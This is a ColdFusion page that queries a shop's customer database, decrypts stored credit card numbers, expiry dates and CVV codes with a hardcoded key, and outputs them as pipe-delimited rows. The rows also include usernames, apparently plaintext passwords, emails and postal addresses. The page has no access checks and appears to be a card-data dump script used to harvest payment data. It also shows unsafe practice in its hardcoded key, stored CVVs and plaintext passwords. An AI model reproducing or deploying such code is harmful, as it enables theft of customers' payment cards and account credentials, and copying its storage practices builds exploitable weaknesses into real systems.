<CFSET request.cckey = "GhFuu7Hjjndsii873nmjma78H">

<cffunction name="cfdecrypt" access="public" returntype="string" output="false">
        <cfargument name="mystring" type="string" required="yes" default="">
        <cfset var ThisString = decrypt(arguments.mystring, request.cckey)>
        <cfreturn ThisString>
</cffunction>

<cfquery name="header" datasource="downtown304SQL">
	SELECT 
		a.accountID,
		a.ccTypeID,
		a.ccNum,
		a.ccExpMo,
		a.ccExpYr,
		a.ccCCV,
		a.ccFirstName,
		a.ccName,
		a.ccNameTemp,
		b.firstName,
		b.lastName,
		b.countryID,
		b.username,
		b.password,
		b.email,
		c.addName,
		c.firstName,
		c.lastName,
		c.add1,
		c.add2,
		c.add3,
		c.city,
		c.stateID,
		c.stateprov,
		c.postcode,
		c.countryID,
		c.phone1,
		c.fax
	FROM (dbo.userCards a
	LEFT JOIN dbo.custAccounts b
		ON a.accountID = b.ID)
	LEFT OUTER JOIN dbo.custAddresses c
		ON a.accountID = c.custID
	WHERE a.ccNum LIKE '%[!@$^&*()_+A-F0-9]%' ESCAPE '$'
</cfquery>

<cfoutput>accountID|ccTypeID|ccNum|ccExpMo|ccExpYr|ccCCV|ccFirstName|ccName|ccNameTemp|firstName|lastName|countryID|username|password|email|addName|firstName|lastName|add1|add2|add3|city|stateID|stateprov|postcode|countryID|phone1|fax<br></cfoutput>

<cfloop query="header">
<cfoutput>#accountID#|#ccTypeID#|#cfdecrypt(ccNum)#|#cfdecrypt(ccExpMo)#|#cfdecrypt(ccExpYr)#|#cfdecrypt(ccCCV)#|#ccFirstName#|#ccName#|#ccNameTemp#|#firstName#|#lastName#|#countryID#|#username#|#password#|#email#|#addName#|#firstName#|#lastName#|#add1#|#add2#|#add3#|#city#|#stateID#|#stateprov#|#postcode#|#countryID#|#phone1#|#fax#<br></cfoutput>
</cfloop>